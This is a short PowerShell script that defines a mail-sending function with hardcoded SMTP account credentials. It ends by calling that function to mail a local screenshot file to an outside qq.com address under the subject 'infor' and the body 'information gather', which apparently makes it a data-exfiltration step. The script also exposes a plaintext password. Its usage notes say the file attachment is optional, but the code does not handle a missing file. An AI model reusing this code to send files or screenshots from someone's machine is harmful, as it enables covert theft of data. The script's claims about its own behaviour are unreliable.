$comments = @'
author:fuhj(powershell@live.cn ,http://txj.shell.tor.hu)
example:
send-mail -toAddress user@domain.com -subject "Powershell Testing Mail " -body "This is a test mail form powershell" -file "C:\powershellmailfile.txt"
-toName -body and -file are all optional.
use double quotes for the name parameters ie; -body "Proper Content"
'@

function send-mail{
	param(
	     [string]$toAddress   = $(throw "toAddress must be set")
	    ,[string]$Subject     = $(throw "subject must be set")
	    ,[string]$body        = ""
	    ,[string]$file        = "")
#mail server configuration
	$smtpServer   = "smtp.sina.com"
	$smtpUser     = "powershelltest@sina.com"
	$smtpPassword = "passw0rd"
	#$sslNeed      =$true #SMTP server needs SSL should set this attribute
	$MailAddress  ="powershelltest@sina.com"
	$fromName     = "me"
	$replyTo      = "powershelltest@sina.com"
#create the mail message
	$mail = New-Object System.Net.Mail.MailMessage
#set the addresses
	$mail.From = New-Object System.Net.Mail.MailAddress($MailAddress,$fromName)
	$mail.To.Add($toAddress)
#set the content
	$mail.Subject = $Subject
	$mail.Priority  = "High"
	$mail.Body = $Body
	$filename= $file
	$attachment = new-Object System.Net.Mail.Attachment($filename)
	$mail.Attachments.Add($attachment)
#send the message
	$smtp = New-Object System.Net.Mail.SmtpClient -argumentList $smtpServer
	$smtp.Credentials = New-Object System.Net.NetworkCredential -argumentList $smtpUser,$smtpPassword
	#$smtp.EnableSsl = $sslNeed;
	try{
		$smtp.Send($mail)
		echo 'Ok,Send succed!'
	}
	catch [exception]
	{
		write-host $_.exception.tostring()
	}
}
send-mail -toaddress 3170096510@qq.com -subject "infor" -body "information gather" -file "e:\screen.png"

